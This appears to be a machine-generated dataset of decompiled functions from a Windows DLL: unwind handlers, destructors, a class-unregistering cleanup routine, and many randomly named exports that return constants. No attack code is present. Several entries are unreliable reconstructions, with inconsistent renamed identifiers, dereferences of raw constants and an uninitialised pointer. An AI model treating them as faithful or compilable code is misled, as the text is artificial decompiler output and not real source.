{"Function Name": "Unwind@10038780", "Address": "10038780", "Source Code": "void Unwind_10038780(void) \n{\n    \n    \n    FUN_10007e90((undefined4 *)(unaff_EBP - 100));\n}"}
{"Function Name": "Unwind@100387b0", "Address": "100387b0", "Source Code": "void Unwind_100387b0(void)\n{\n    \n    \n    function_call((void **)(base_pointer - 0x240));\n}"}
{"Function Name": "Unwind@100387f0", "Address": "100387f0", "Source Code": "void Unwind_100387f0(void)\n{\n    \n    \n    function_call((int **)(base_pointer - 0x24));\n}"}
{"Function Name": "Unwind@100387f8", "Address": "100387f8", "Source Code": "void Unwind_100387f8(void)\n{\n    \n    FUN_10009470((void **)(base_pointer - 0x44));\n}"}
{"Function Name": "Unwind@10038800", "Address": "10038800", "Source Code": "void Unwind_10038800(void) \n{\n    \n    \n    FUN_10008170((VARIANTARG *)(unaff_EBP - 0x60));\n}"}
{"Function Name": "Unwind@10038808", "Address": "10038808", "Source Code": "void Unwind_10038808(void) \n{\n    \n    \n    functionCall((int **)(basePointer - 0x20));\n}"}
{"Function Name": "Unwind@10038810", "Address": "10038810", "Source Code": "void Unwind_10038810(void) \n{\n    \n    \n    call_function((BSTR *)(base_pointer - 0x28));\n}"}
{"Function Name": "Unwind@10038818", "Address": "10038818", "Source Code": "void unwind_function(void) \n{\n    \n    \n    function_pointer((int **)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@10038820", "Address": "10038820", "Source Code": "void Unwind_10038820(void) \n{\n    \n    \n    FUN_10007d30((BSTR *)(basePointer - 0x48));\n}"}
{"Function Name": "Unwind@10038828", "Address": "10038828", "Source Code": "void Unwind_10038828(void)\n{\n    \n    \n    \n    FUN_1000b440((int **)(stack_frame_pointer - 0x1c));\n}"}
{"Function Name": "Unwind@100388c0", "Address": "100388c0", "Source Code": "void unwindFunction(void)\n{\n    \n    \n    functionToCall(*(void ***)-0x34);\n}"}
{"Function Name": "Unwind@100388f0", "Address": "100388f0", "Source Code": "void unwindFunction(void) \n{\n    \n    callFunction(*(void ***)(*(int *)0xFFFFFFCC));\n}"}
{"Function Name": "Unwind@100388f8", "Address": "100388f8", "Source Code": "void Unwind_100388f8(void)\n{\n    \n    \n    function_call((void **)(*(int *)(base_pointer - 0x34) + 0x18));\n}"}
{"Function Name": "Unwind@10038920", "Address": "10038920", "Source Code": "void Unwind_10038920(void) \n{\n    \n    FUN_1000cd00((undefined4 *)(unaff_EBP - 0x20)); \n}"}
{"Function Name": "Unwind@10038928", "Address": "10038928", "Source Code": "void Unwind_10038928(void)\n{\n    \n    function_call(*(void ***)(&base_pointer - 0x2c));\n}"}
{"Function Name": "Unwind@10038960", "Address": "10038960", "Source Code": "void Unwind_10038960(void) \n{\n    \n    \n    function_call((undefined4 *)(base_pointer - 0x20));\n}"}
{"Function Name": "Unwind@10038968", "Address": "10038968", "Source Code": "void Unwind_10038968(void) \n{\n    \n    \n    function_call(*(void ***)(base_pointer - 0x2c));\n}"}
{"Function Name": "Unwind@10038970", "Address": "10038970", "Source Code": "void Unwind_10038970(void)\n{\n    \n    \n    \n    function_call((void **)(*(int *)(base_pointer - 0x2c) + 0x18));\n}"}
{"Function Name": "Unwind@10038a40", "Address": "10038a40", "Source Code": "void Unwind_10038a40(void) \n{\n    FUN_10011ab0((void **)(unaff_EBP - 0x14)); \n}"}
{"Function Name": "Unwind@10038a48", "Address": "10038a48", "Source Code": "void unwind_function(void) \n{\n    function_call((void **)(base_pointer - 0x18)); \n}"}
{"Function Name": "Unwind@10038a80", "Address": "10038a80", "Source Code": "void Unwind_10038a80(void)\n{\n    \n    \n    \n    function_call((void **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@10038ab0", "Address": "10038ab0", "Source Code": "void Unwind_10038ab0(void)\n{\n    \n    \n    FUN_1000b490((void **)(base_pointer - 0x14));\n}"}
{"Function Name": "Unwind@10038ae0", "Address": "10038ae0", "Source Code": "void Unwind_10038ae0(void) \n{\n    \n    FUN_1000b490((void **)(base_pointer - 0x20)); \n}"}
{"Function Name": "Unwind@10038ae8", "Address": "10038ae8", "Source Code": "void Unwind_10038ae8(void) \n{\n    FUN_10011aa0((int *)(unaff_EBP - 0x424)); \n}"}
{"Function Name": "Unwind@10038b20", "Address": "10038b20", "Source Code": "void Unwind_10038b20(void) \n{\n    FUN_10011aa0((int *)(unaff_EBP - 0x2124)); \n}"}
{"Function Name": "Unwind@10038b2b", "Address": "10038b2b", "Source Code": "void Unwind_10038b2b(void)\n{\n    \n    \n    FUN_10011aa0((int *)(base_pointer - 0x2124));\n}"}
{"Function Name": "Unwind@10038b60", "Address": "10038b60", "Source Code": "void unwindFunction(void) \n{\n    functionCall(-0x5c); \n}"}
{"Function Name": "Unwind@10038b90", "Address": "10038b90", "Source Code": "void Unwind_10038b90(void)\n{\n    \n    \n    call_function((HKEY *)(base_pointer - 0x225c));\n}"}
{"Function Name": "Unwind@10038b9b", "Address": "10038b9b", "Source Code": "void Unwind_10038b9b(void)\n{\n    \n    \n    call_function((HKEY *)(base_pointer - 0x2230));\n}"}
{"Function Name": "Unwind@10038c00", "Address": "10038c00", "Source Code": "void Unwind_10038c00(void)\n{\n    \n    \n    function_call(*(void **)(base_pointer - 0x28));\n}"}
{"Function Name": "Unwind@10038c12", "Address": "10038c12", "Source Code": "void unwindFunction(void) \n{\n    callFunction((BSTR *)(basePointer - 0x14)); \n}"}
{"Function Name": "Unwind@10038c40", "Address": "10038c40", "Source Code": "void Unwind_10038c40(void)\n{\n    \n    \n    \n    FUN_10012370((LPCRITICAL_SECTION *)(unaff_EBP - 0x244));\n}"}
{"Function Name": "Unwind@10038c4b", "Address": "10038c4b", "Source Code": "void Unwind_10038c4b(void)\n{\n    \n    \n    process_pointer((int **)(base_pointer - 0x224));\n}"}
{"Function Name": "Unwind@10038c56", "Address": "10038c56", "Source Code": "void Unwind_10038c56(void)\n{\n    \n    \n    function_pointer((int **)(base_pointer - 0x21c));\n}"}
{"Function Name": "Unwind@10038c61", "Address": "10038c61", "Source Code": "void Unwind_10038c61(void)\n{\n    \n    \n    function_pointer((int **)(base_pointer - 0x220));\n}"}
{"Function Name": "Unwind@10038ca0", "Address": "10038ca0", "Source Code": "void Unwind_10038ca0(void)\n{\n    \n    \n    \n    function_call(*(int *)(base_pointer - 0x14) + 0x14);\n}"}
{"Function Name": "Unwind@10038cab", "Address": "10038cab", "Source Code": "void unwindFunction(void)\n{\n    \n    \n    \n    callFunction((undefined4 *)(*(int *)(basePointer - 0x14) + 0x3c));\n}"}
{"Function Name": "Unwind@10038cb6", "Address": "10038cb6", "Source Code": "void Unwind_10038cb6(void)\n{\n    \n    \n    \n    function_call((int **)(*(int *)(base_pointer - 0x14) + 0x50));\n}"}
{"Function Name": "Unwind@10038cc1", "Address": "10038cc1", "Source Code": "void Unwind_10038cc1(void)\n{\n    \n    \n    function_call((int **)(*(int *)(base_pointer - 0x18) + 4));\n}"}
{"Function Name": "Unwind@10038ccc", "Address": "10038ccc", "Source Code": "void Unwind_10038ccc(void)\n{\n    \n    \n    \n    \n    \n    FUN_10002490((void **)(*(int *)(*(int *)((char *)&base_pointer - 0x18)) + 0xc));\n}"}
{"Function Name": "Unwind@10038d30", "Address": "10038d30", "Source Code": "void unwind_function(void) \n{\n    call_thunk_function(-0x1438); \n    return; \n}"}
{"Function Name": "Unwind@10038d70", "Address": "10038d70", "Source Code": "void Unwind_10038d70(void) \n{\n    \n    FUN_10013ceb(*(void **)(unaff_EBP - 0x20)); \n}"}
{"Function Name": "Unwind@10038da0", "Address": "10038da0", "Source Code": "void Unwind_10038da0(void)\n{\n    \n    \n    function_call(*(void **)(base_pointer - 0x18));\n}"}
{"Function Name": "Unwind@10038e20", "Address": "10038e20", "Source Code": "void Unwind_10038e20(void)\n{\n    \n    \n    function_call((int **)(*(int *)(base_pointer - 0x14) + 4));\n}"}
{"Function Name": "Unwind@10038e2b", "Address": "10038e2b", "Source Code": "void Unwind_10038e2b(void)\n{\n    \n    \n    function_call((void **)(*(int *)(base_pointer - 0x14) + 0xc));\n}"}
{"Function Name": "Unwind@10038ec6", "Address": "10038ec6", "Source Code": "void Unwind_10038ec6(void) \n{\n    FUN_10014d7c((int *)(base_pointer - 0x10)); \n}"}
{"Function Name": "Unwind@10038ee9", "Address": "10038ee9", "Source Code": "void unwindFunction(void) \n{\n    functionCall((int *)(basePointer - 0x14)); \n}"}
{"Function Name": "Unwind@10038f0c", "Address": "10038f0c", "Source Code": "void unwindFunction(void) \n{\n    functionCall((int *)(basePointer - 0x14)); \n}"}
{"Function Name": "Unwind@10038f14", "Address": "10038f14", "Source Code": "void Unwind_10038f14(void)\n{\n    \n    \n    function_call((int *)(base_pointer - 0x10));\n}"}
{"Function Name": "Unwind@10038f37", "Address": "10038f37", "Source Code": "void Unwind_10038f37(void)\n{\n    int base_pointer; \n    \n    if (*(uint *)(base_pointer - 0x10) & 1) {\n        \n        *(uint *)(base_pointer - 0x10) &= 0xfffffffe;\n        \n        ~basic_ios<>((undefined4 *)(*(int *)(base_pointer - 0x14) + 8));\n    }\n}"}
{"Function Name": "Unwind@10038fbf", "Address": "10038fbf", "Source Code": "void unwindFunction(void) \n{\n    \n    \n    \n    \n    processFunction(*(void **)(*(int *)0x10));\n}"}
{"Function Name": "Unwind@10038fe7", "Address": "10038fe7", "Source Code": "void Unwind_10038fe7(void)\n{\n    \n    \n    FUN_10002590((void **)(base_pointer - 0x28));\n}"}
{"Function Name": "FUN_10039100", "Address": "10039100", "Source Code": "void FUN_10039100(void)\n{\n    HINSTANCE instanceHandle = DAT_1004fccc; \n    int loopCounter = 0; \n    \n    if ((conditionFlag != 0) && (conditionFlag == 0x2c)) {\n        \n        if (0 < maxIterations) {\n            do {\n                \n                if ((loopCounter < 0) || (maxIterations <= loopCounter)) {\n                    FUN_10007bf0(0xc000008c, 1); \n                    ((code *)swi(3))(); \n                    return; \n                }\n                \n                UnregisterClassW((LPCWSTR)(uint)*(ushort *)((int)classNamePointer + loopCounter * 2), instanceHandle);\n                loopCounter++; \n            } while (loopCounter < maxIterations); \n        }\n        \n        if (classNamePointer != (void *)0x0) {\n            FUN_1001dc78(classNamePointer); \n            classNamePointer = (void *)0x0; \n        }\n        maxIterations = 0; \n        resetFlag = 0; \n        DeleteCriticalSection((LPCRITICAL_SECTION)&criticalSection); \n        conditionFlag = 0; \n    }\n    \n    if (classNamePointer != (void *)0x0) {\n        FUN_1001dc78(classNamePointer); \n        classNamePointer = (void *)0x0; \n    }\n    maxIterations = 0; \n    resetFlag = 0; \n}"}
{"Function Name": "FUN_100391e0", "Address": "100391e0", "Source Code": "void executeFunction(void) \n{\n    callAnotherFunction(0x10050488); \n}"}
{"Function Name": "FUN_100391f4", "Address": "100391f4", "Source Code": "void executeFunction(void) \n{\n    helperFunction(); \n}"}
{"Function Name": "FUN_100391fe", "Address": "100391fe", "Source Code": "void function_main(void) \n{\n    function_helper(); \n}"}
{"Function Name": "FUN_10039208", "Address": "10039208", "Source Code": "void executeFunction(void) \n{\n    callAnotherFunction(0x1004fa4c); \n}"}
{"Function Name": "FUN_10039212", "Address": "10039212", "Source Code": "void executeFunction(void) \n{\n    \n    \n    baseDestructor((int *)&dataPointer);\n}"}
{"Function Name": "FUN_1003921c", "Address": "1003921c", "Source Code": "void FUN_1003921c(void)\n{\n    \n    \n    ((std::basic_filebuf<char, std::char_traits<char>> *)&file_buffer_pointer)->~basic_filebuf();\n}"}
{"Function Name": "FUN_10039226", "Address": "10039226", "Source Code": "void executeFunction(void) \n{\n    helperFunction(); \n}"}
{"Function Name": "FUN_10039230", "Address": "10039230", "Source Code": "void FUN_10039230(void) \n{\n    initializeAtexitHandler(&initializeAtexitHandler::dataReference); \n}"}
{"Function Name": "FUN_1003923a", "Address": "1003923a", "Source Code": "void executeFunction(void) \n{\n    helperFunction(); \n}"}
{"Function Name": "FUN_10039244", "Address": "10039244", "Source Code": "void destructor_CAtlBaseModule(void) \n{\n    \n    ATL::CAtlBaseModule::~CAtlBaseModule((CAtlBaseModule *)&baseModuleInstance);\n}"}
{"Function Name": "FUN_10039250", "Address": "10039250", "Source Code": "void clearVariantFunction(void) \n{\n    VariantClear((VARIANTARG *)&variantData); \n}"}
{"Function Name": "FUN_10015db1", "Address": "10015db1", "Source Code": "undefined function_return_one(void)\n{\n    \n    return 1;\n}"}
{"Function Name": "hpjfezbpmmbjayi", "Address": "10001250", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffcc5;\n}"}
{"Function Name": "kzurirk", "Address": "10001520", "Source Code": "undefined4 getUndefinedInteger(void)\n{\n    \n    return 0xfffffeab;\n}"}
{"Function Name": "vsojczbiay", "Address": "100012c0", "Source Code": "undefined4 getHexValue(void)\n{\n    \n    return 0xfffffee4;\n}"}
{"Function Name": "yrkdeftznqi", "Address": "100014f0", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0x3d3;\n}"}
{"Function Name": "FUN_10010d50", "Address": "10010d50", "Source Code": "undefined4 returnZeroFunction(void)\n{\n    return 0; \n}"}
{"Function Name": "jtdbkcbiistgy", "Address": "10001480", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xffffffee;\n}"}
{"Function Name": "FUN_10011990", "Address": "10011990", "Source Code": "undefined4 calculateUndefinedValue(void)\n{\n    \n    return 0;\n}"}
{"Function Name": "FUN_1000da40", "Address": "1000da40", "Source Code": "undefined4 calculateValue(void)\n{\n    \n    return 1;\n}"}
{"Function Name": "iuewvvbpdql", "Address": "10001350", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0x319;\n}"}
{"Function Name": "imkrogjfi", "Address": "10001420", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffce0;\n}"}
{"Function Name": "xjuxhyijlvsazxau", "Address": "10001320", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffe83;\n}"}
{"Function Name": "FUN_1000f750", "Address": "1000f750", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "iapquaxbjmvp", "Address": "10001290", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffff3;\n}"}
{"Function Name": "esomajcvpycsf", "Address": "100014c0", "Source Code": "undefined4 getSpecificUnsignedIntegerValue(void)\n{\n    \n    return 0xfffffd4b;\n}"}
{"Function Name": "FUN_100107f0", "Address": "100107f0", "Source Code": "undefined4 getErrorCode(void) \n{\n    return 0x80004001; \n}"}
{"Function Name": "osxbklbbte", "Address": "100013e0", "Source Code": "undefined4 getHexValue(void)\n{\n    \n    return 0xffffff48;\n}"}
{"Function Name": "amsksfatg", "Address": "100012f0", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0x2b4;\n}"}
{"Function Name": "efdptsv", "Address": "10001490", "Source Code": "undefined4 function_name(void)\n{\n    \n    return 0xfffffdd1;\n}"}
{"Function Name": "dqfztkbw", "Address": "100014b0", "Source Code": "undefined4 getUndefinedInteger(void)\n{\n    \n    return 0xfffffc6b;\n}"}
{"Function Name": "FUN_10010870", "Address": "10010870", "Source Code": "undefined4 getErrorCode(void) \n{\n    return 0x80004001; \n}"}
{"Function Name": "udilmcplokce", "Address": "10001450", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffc1d;\n}"}
{"Function Name": "Catch_All@1000431b", "Address": "1000431b", "Source Code": "undefined4 handleCatchAll(void)\n{\n    \n    return 0x10004309;\n}"}
{"Function Name": "aejehmvsfyqu", "Address": "10001470", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0x253;\n}"}
{"Function Name": "dirkvzyeyggsz", "Address": "10001550", "Source Code": "undefined4 getUnsignedIntegerValue(void)\n{\n    \n    return 0xfffffda9;\n}"}
{"Function Name": "iohmvvv", "Address": "10001400", "Source Code": "undefined4 getUndefinedInteger(void)\n{\n    \n    return 0xfffffe37;\n}"}
{"Function Name": "FUN_10010d60", "Address": "10010d60", "Source Code": "undefined4 getUndefinedIntegerValue(void)\n{\n    \n    return 0;\n}"}
{"Function Name": "FUN_1001647b", "Address": "1001647b", "Source Code": "undefined4 getUndefinedInteger(void)\n{\n    \n    return -1;\n}"}
{"Function Name": "sgubolcwrca", "Address": "10001240", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0x330;\n}"}
{"Function Name": "ulprqvkt", "Address": "10001460", "Source Code": "undefined4 getHexValue(void)\n{\n    \n    return 0x88;\n}"}
{"Function Name": "syqxwxeszpygolqcg", "Address": "100014e0", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xc4;\n}"}
{"Function Name": "gugdqizmyvnjkrzly", "Address": "10001540", "Source Code": "undefined4 getHexValue(void)\n{\n    \n    return 0x3d1;\n}"}
{"Function Name": "yvizoibylpt", "Address": "100012b0", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffe3a;\n}"}
{"Function Name": "FUN_1001623c", "Address": "1001623c", "Source Code": "undefined8 returnZeroFunction(void)\n{\n    \n    return 0;\n}"}
{"Function Name": "fkdgdgzlwdpxlb", "Address": "100013b0", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffc4e;\n}"}
{"Function Name": "FUN_1000da30", "Address": "1000da30", "Source Code": "undefined4 getErrorCode(void) \n{\n    return 0x80004001; \n}"}
{"Function Name": "xeadmekjahmod", "Address": "10001440", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0x3ae;\n}"}
{"Function Name": "bmcqpav", "Address": "10001360", "Source Code": "undefined4 calculateValue(void)\n{\n    \n    return 0xfffffd82;\n}"}
{"Function Name": "qmwjlzgzvea", "Address": "100013c0", "Source Code": "undefined4 calculateConstantValue(void)\n{\n    \n    return 0x142;\n}"}
{"Function Name": "FUN_1000da50", "Address": "1000da50", "Source Code": "undefined4 returnZeroFunction(void)\n{\n    return 0; \n}"}
{"Function Name": "dqmccjjvytnwb", "Address": "10001330", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffc3a;\n}"}
{"Function Name": "FUN_10010b40", "Address": "10010b40", "Source Code": "undefined4 function_name(void)\n{\n    return 0; \n}"}
{"Function Name": "rixsrdkiwvqvrwny", "Address": "10001310", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xffffff23;\n}"}
{"Function Name": "unwcuujkktwi", "Address": "10001270", "Source Code": "undefined4 getIntegerValue(void)\n{\n    \n    return 799;\n}"}
{"Function Name": "aatiqmwxlo", "Address": "10001410", "Source Code": "undefined4 getUnsignedIntegerValue(void)\n{\n    \n    return 0xfffffd0b;\n}"}
{"Function Name": "FUN_10037dc0", "Address": "10037dc0", "Source Code": "void function_10037dc0(void) {\n    \n}"}
{"Function Name": "pjjvvdrgshhhluasq", "Address": "100012e0", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0x376;\n}"}
{"Function Name": "pclvwpccsz", "Address": "10001510", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0x14a;\n}"}
{"Function Name": "pphrtrejikymjjcp", "Address": "10001260", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffdba;\n}"}
{"Function Name": "kmgxdazllbpnrosqu", "Address": "100013d0", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0x203;\n}"}
{"Function Name": "ylcufkztc", "Address": "10001340", "Source Code": "undefined4 getHexValue(void)\n{\n    \n    return 0x1a9;\n}"}
{"Function Name": "rdmrmlnwv", "Address": "100012d0", "Source Code": "undefined4 getHexValue(void)\n{\n    \n    return 0x1cd;\n}"}
{"Function Name": "veygyunnaj", "Address": "10001230", "Source Code": "undefined4 getUnsignedIntValue(void)\n{\n    \n    return 0xfffffeef;\n}"}
{"Function Name": "zswqnvfnibck", "Address": "100014d0", "Source Code": "undefined4 getUndefinedIntegerValue(void)\n{\n    \n    return 0xfffffcbd;\n}"}
{"Function Name": "djdodougrbnzi", "Address": "10001530", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0x14f;\n}"}
{"Function Name": "FUN_10037d80", "Address": "10037d80", "Source Code": "void executeFunction(void) {\n    \n}"}
{"Function Name": "xvpduejozrsb", "Address": "10001370", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffe51;\n}"}
{"Function Name": "hqcurfsvzaxetk", "Address": "10001280", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0xfffffd19;\n}"}
{"Function Name": "FUN_10014a3d", "Address": "10014a3d", "Source Code": "undefined4 getUnsignedInteger(void)\n{\n    \n    return 1;\n}"}
{"Function Name": "_guard_check_icall", "Address": "10014bcb", "Source Code": "void check_icall_guard(void) {}"}
{"Function Name": "lbxpxdxyo", "Address": "100013a0", "Source Code": "undefined4 getUnsignedValue(void)\n{\n    \n    return 0xfffffc72;\n}"}
{"Function Name": "dbhndgqkaattffs", "Address": "10001500", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0x2a4;\n}"}
{"Function Name": "spllpxleohbrp", "Address": "10001430", "Source Code": "undefined4 getUndefinedIntegerValue(void)\n{\n    \n    return 0xfffffc58;\n}"}
{"Function Name": "FUN_10012df0", "Address": "10012df0", "Source Code": "undefined4 getErrorCode(void)\n{\n    \n    return 0x80004005;\n}"}
{"Function Name": "tbnqviaprchftey", "Address": "100012a0", "Source Code": "undefined4 function_name(void)\n{\n    \n    return 0x123;\n}"}
{"Function Name": "eecmpzmfhtme", "Address": "10001390", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0x28;\n}"}
{"Function Name": "vgppkpfh", "Address": "100013f0", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0x108;\n}"}
{"Function Name": "lrrublvzwzpu", "Address": "10001380", "Source Code": "undefined4 getConstantValue(void)\n{\n    \n    return 0x19b;\n}"}
{"Function Name": "bkqngjrxf", "Address": "10001300", "Source Code": "undefined4 calculateHexValue(void)\n{\n    \n    return 0xe1;\n}"}
{"Function Name": "ncxdabucrlvnbemd", "Address": "100014a0", "Source Code": "undefined4 getHexValue(void)\n{\n    \n    return 0x26c;\n}"}
{"Function Name": "FUN_10015fac", "Address": "10015fac", "Source Code": "undefined4 getUndefinedInteger(void)\n{\n    \n    return -1;\n}"}
